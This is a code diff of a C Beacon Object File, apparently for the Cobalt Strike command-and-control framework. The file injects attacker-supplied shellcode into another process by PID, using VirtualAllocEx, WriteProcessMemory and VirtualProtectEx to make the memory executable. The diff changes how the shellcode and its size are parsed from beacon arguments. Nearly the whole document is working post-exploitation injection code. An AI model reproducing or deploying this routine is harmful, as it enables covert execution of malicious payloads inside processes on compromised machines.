@@ -33,7 +33,7 @@ const byte shellcode[276] = {
 };
 */
 
-void inject(const int pid, const BYTE* shellcode, int shellcodeLen) {
+void inject(const int pid, const CHAR* shellcode, SIZE_T shellcodeSize) {
     BeaconPrintf(CALLBACK_OUTPUT, "shellcode[0..3]: %02x %02x %02x %02x\n",
         shellcode[0], shellcode[1], shellcode[2], shellcode[3]);
 
@@ -48,7 +48,7 @@ void inject(const int pid, const BYTE* shellcode, int shellcodeLen) {
         return;
     }
 
-    LPVOID allocatedMemory = KERNEL32$VirtualAllocEx(hProcess, NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID allocatedMemory = KERNEL32$VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     BeaconPrintf(CALLBACK_OUTPUT, "allocateMemory (pointer) = %p\n", (void*)allocatedMemory);
 
     if (allocatedMemory == 0) {
@@ -59,10 +59,10 @@ void inject(const int pid, const BYTE* shellcode, int shellcodeLen) {
     }
 
     SIZE_T bytesWritten = 0;
-    BOOL writeProcessMemoryRes = KERNEL32$WriteProcessMemory(hProcess, allocatedMemory, shellcode, shellcodeLen, &bytesWritten);
+    BOOL writeProcessMemoryRes = KERNEL32$WriteProcessMemory(hProcess, allocatedMemory, shellcode, shellcodeSize, &bytesWritten);
     BeaconPrintf(CALLBACK_OUTPUT, "bytes written: %llu\n",(unsigned long long)bytesWritten);
 
-    if (writeProcessMemoryRes == 0 || (SIZE_T)bytesWritten != (SIZE_T)shellcodeLen) {
+    if (writeProcessMemoryRes == 0 || (SIZE_T)bytesWritten != (SIZE_T)shellcodeSize) {
         DWORD err = KERNEL32$GetLastError();
         KERNEL32$CloseHandle(hProcess);
         BeaconPrintf(CALLBACK_OUTPUT, "failed to write shellcode to remote process: %lu\n", err);
@@ -70,7 +70,7 @@ void inject(const int pid, const BYTE* shellcode, int shellcodeLen) {
 	}
 
     DWORD oldProtect = 0;
-    BOOL virtualProtectExRes = KERNEL32$VirtualProtectEx(hProcess, allocatedMemory, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
+    BOOL virtualProtectExRes = KERNEL32$VirtualProtectEx(hProcess, allocatedMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
 	if (virtualProtectExRes == 0) {
         DWORD err = KERNEL32$GetLastError();
         KERNEL32$CloseHandle(hProcess);
@@ -106,22 +106,24 @@ VOID go(
     IN ULONG Length
 )
 {
-    int pid = 0;
-	BYTE* shellcode = NULL;
-    int shellcodeLen = 0;
+
 
     datap parser;
     BeaconDataParse(&parser, Buffer, Length);
-    pid = BeaconDataInt(&parser);
-	shellcode = BeaconDataExtract(&parser, NULL);
-    shellcodeLen = BeaconDataInt(&parser);
+
+
+    DWORD pid = BeaconDataInt(&parser);
+    int shellcodeSizeInt = 0;
+    CHAR* shellcode = BeaconDataExtract(&parser, &shellcodeSizeInt);
+    SIZE_T shellcodeSize = (SIZE_T)shellcodeSizeInt;
+
 
     if (!bofstart())
     {
         return;
     }
 
-    inject(pid, shellcode, shellcodeLen);
+    inject(pid, shellcode, shellcodeSize);
 
     printoutput(TRUE);
     bofstop();
